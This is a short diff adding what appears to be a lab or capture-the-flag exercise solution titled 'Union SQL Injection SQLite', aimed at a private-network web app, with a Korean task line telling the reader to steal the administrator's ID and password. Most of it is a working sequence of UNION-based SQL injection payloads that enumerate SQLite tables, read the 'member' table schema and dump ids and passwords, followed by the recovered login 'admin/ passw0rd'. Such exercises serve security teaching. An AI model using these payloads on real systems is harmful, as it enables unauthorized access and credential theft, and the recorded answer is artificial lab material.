@@ -1,0 +1,20 @@
+=============================
+
+ Union SQL Injection SQLite
+=============================
+
+ http://192.168.72.40:5000
+
+관리자의 아이디와 비밀번호를 탈취하세요.
+
+
+
+1. 
+' UNION SELECT 1,2,3,4,5 --
+' UNION SELECT name,'','','','' FROM sqlite_master WHERE type='table' --
+' UNION SELECT sql,'','','','' FROM sqlite_master WHERE type='table' AND name='member' --
+' UNION SELECT CAST(id AS TEXT), CAST(password AS TEXT), '', '', '' FROM member --
+
+2. admin/ passw0rd
+
+=============================
